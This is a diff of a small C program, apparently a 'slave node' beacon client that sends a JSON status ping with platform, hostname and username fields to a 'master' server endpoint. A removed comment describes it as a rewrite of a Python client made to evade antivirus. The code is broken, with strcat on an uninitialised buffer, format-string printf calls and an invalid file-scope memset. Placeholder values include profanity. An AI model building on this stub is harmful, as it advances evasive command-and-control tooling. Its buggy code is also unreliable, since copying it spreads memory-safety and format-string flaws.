@@ -5,8 +5,7 @@
 #include <sys/socket.h> 
 #include <netinet/in.h> 
 #include <netdb.h> 
-//rewritre of client.py to evade antivrus 
-memset(0xFFFFFF, "Catch me if you can", 20);
+
 
 //slave node formulate request for the master given endpoint, req type, and data(json) for post
 char* create_request(char* type, char* endpoint, char* data){
@@ -27,12 +26,13 @@ char* create_request(char* type, char* endpoint, char* data){
 
 char* form_ping_json(){
     char* data = (char*)malloc(400);
-    strcat(&data, "{ \"platform\": ");
-    strcat(&data, "endlmfao,");
-    strcat(&data, " \"hostname\": ");
-    strcat(&data, "behenchod,");
-    strcat(&data, " \"username\": ");
-    strcat(&data, "fiveoh }");
+    strcat(data, "{ \"platform\": ");
+    printf("end\n");
+    strcat(data, "endlmfao,");
+    strcat(data, " \"hostname\": ");
+    strcat(data, "behenchod,");
+    strcat(data, " \"username\": ");
+    strcat(data, "fiveoh }");
     printf(data);
     return data;
 }
@@ -46,6 +46,7 @@ char* send_request(char* request, char* type){
 
     char message[1024], response[4096];
     printf("hanging\n");
+    printf("catch\n");
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0){
         printf("checking sockfd\n");
@@ -101,8 +102,9 @@ char* send_request(char* request, char* type){
 
 
 int main(int argc, char** argv){
+    printf("print");
     char* data = form_ping_json();
-    printf(data);
-    char* r = send_request(create_request("POST", "/api/6669/status", form_ping_json()), "POST");
-    printf("%s", r);
+    printf("%s", data);
+    char* r = send_request(create_request("POST", "/api/6669/status","sdfsf"), "POST");
+   
 } 
